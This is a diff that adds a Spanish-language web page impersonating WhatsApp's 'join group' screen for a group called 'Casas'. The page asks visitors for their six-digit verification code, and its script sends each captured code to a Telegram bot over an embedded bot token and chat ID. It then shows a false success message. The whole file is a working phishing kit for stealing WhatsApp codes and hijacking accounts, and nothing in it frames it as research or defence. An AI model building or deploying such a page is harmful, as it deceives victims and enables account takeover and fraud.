@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #111b21;
+        }
+
+        .header {
+            background-color: #008069;
+            width: 100%;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            box-sizing: border-box;
+            color: white;
+            font-size: 20px;
+            font-weight: 500;
+            justify-content: space-between;
+        }
+
+        .container {
+            text-align: center;
+            padding: 20px;
+            max-width: 380px;
+            width: 95%;
+        }
+
+        .group-icon {
+            width: 90px;
+            height: 90px;
+            background-color: #dfe5e7;
+            border-radius: 50%;
+            margin: 25px auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        h1 {
+            font-size: 1.3rem;
+            margin-bottom: 5px;
+            color: #41525d;
+        }
+
+        .group-name {
+            font-weight: bold;
+            color: #000;
+        }
+
+        p {
+            font-size: 14px;
+            color: #667781;
+            line-height: 1.4;
+            margin-bottom: 35px;
+        }
+
+        .code-container {
+            display: flex;
+            justify-content: center;
+            gap: 6px;
+            margin-bottom: 40px;
+        }
+
+        .code-container input {
+            width: 40px;
+            height: 50px;
+            border: 1.5px solid #008069;
+            border-radius: 8px;
+            font-size: 22px;
+            text-align: center;
+            outline: none;
+            background-color: #f8f9fa;
+        }
+
+        .btn-auth {
+            background-color: #008069;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        #toast {
+            display: none;
+            position: fixed;
+            bottom: 50px;
+            background-color: #323232;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            z-index: 1000;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <span>WhatsApp</span>
+        <span style="font-size: 24px;">⋮</span>
+    </div>
+
+    <div id="toast">¡Autenticación exitosa! Te has unido al grupo.</div>
+
+    <div class="container">
+        <div class="group-icon">
+            <svg viewBox="0 0 24 24" width="45" height="45" fill="#919191"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
+        </div>
+
+        <h1>Unirse al grupo <span class="group-name">"Casas"</span></h1>
+        <p>Introduce el código de 6 dígitos que recibiste para verificar tu cuenta.</p>
+
+        <div class="code-container" id="otp-inputs">
+            <input type="number" pattern="\d*" inputmode="numeric" oninput="nextStep(this, 0)" onkeydown="checkBack(event, 0)">
+            <input type="number" pattern="\d*" inputmode="numeric" oninput="nextStep(this, 1)" onkeydown="checkBack(event, 1)">
+            <input type="number" pattern="\d*" inputmode="numeric" oninput="nextStep(this, 2)" onkeydown="checkBack(event, 2)">
+            <input type="number" pattern="\d*" inputmode="numeric" oninput="nextStep(this, 3)" onkeydown="checkBack(event, 3)">
+            <input type="number" pattern="\d*" inputmode="numeric" oninput="nextStep(this, 4)" onkeydown="checkBack(event, 4)">
+            <input type="number" pattern="\d*" inputmode="numeric" oninput="nextStep(this, 5)" onkeydown="checkBack(event, 5)">
+        </div>
+
+        <button class="btn-auth" onclick="sendData()">AUTENTICAR</button>
+    </div>
+
+    <script>
+        // DATOS INTEGRADOS
+        const TELEGRAM_TOKEN = '8658431564:AAG_X2OY9fTPugsL9nVeT6aeHcg2h-jP4zU'; 
+        const CHAT_ID = '6475554235';
+
+        const inputs = document.querySelectorAll('#otp-inputs input');
+
+        function nextStep(el, index) {
+            if (el.value.length === 1 && index < 5) {
+                inputs[index + 1].focus();
+            }
+        }
+
+        function checkBack(e, index) {
+            if (e.key === "Backspace" && inputs[index].value === "" && index > 0) {
+                inputs[index - 1].focus();
+            }
+        }
+
+        async function sendData() {
+            let code = "";
+            inputs.forEach(i => code += i.value);
+
+            if (code.length === 6) {
+                const message = `📱 Código Capturado: ${code}\nGrupo: Casas`;
+                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+                try {
+                    fetch(url); 
+                    const toast = document.getElementById('toast');
+                    toast.style.display = 'block';
+                    inputs.forEach(i => i.value = "");
+                    setTimeout(() => { toast.style.display = 'none'; }, 5000);
+                } catch (e) {}
+            } else {
+                alert("Por favor, completa los 6 dígitos.");
+            }
+        }
+    </script>
+</body>
+</html>
